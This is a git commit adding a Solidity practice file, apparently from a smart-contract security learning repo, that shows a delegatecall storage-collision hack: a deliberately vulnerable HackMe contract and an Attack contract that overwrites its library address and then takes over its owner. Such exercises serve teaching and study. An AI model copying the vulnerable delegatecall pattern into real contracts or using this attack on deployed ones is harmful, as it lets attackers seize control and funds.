b5fbac988ab4f0790a0cf7900b580eeaa880f12e
Alok Kumar <rahul05alok@gmail.com>
2023-12-19 16:27:04 +0530

    Done with basic DelegateCall hacks

---
+++ src/3-Hacks/DelegateCall/hack2.sol
@@ -0,0 +1,49 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.19;
+
+contract Lib {
+    uint public someNumber;
+
+    function doSomething(uint _num) public {
+        someNumber = _num;
+    }
+}
+
+contract HackMe {
+    address public lib;
+    address public owner;
+    uint public someNumber;
+
+    constructor(address _lib) {
+        lib = _lib;
+        owner = msg.sender;
+    }
+
+    function doSomething(uint _num) public {
+        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
+    }
+}
+
+contract Attack {
+    address public lib;
+    address public owner;
+    uint public someNumber;
+
+    HackMe public hackMe;
+
+    constructor(HackMe _hackMe) {
+        hackMe = HackMe(_hackMe);
+    }
+
+    function attack() public {
+        // override address of lib
+        hackMe.doSomething(uint(uint160(address(this))));
+        // pass any number as input, the function doSomething() below will be called
+        hackMe.doSomething(1);
+    }
+
+    // function signature must match HackMe.doSomething()
+    function doSomething(uint _num) public {
+        owner = msg.sender;
+    }
+}
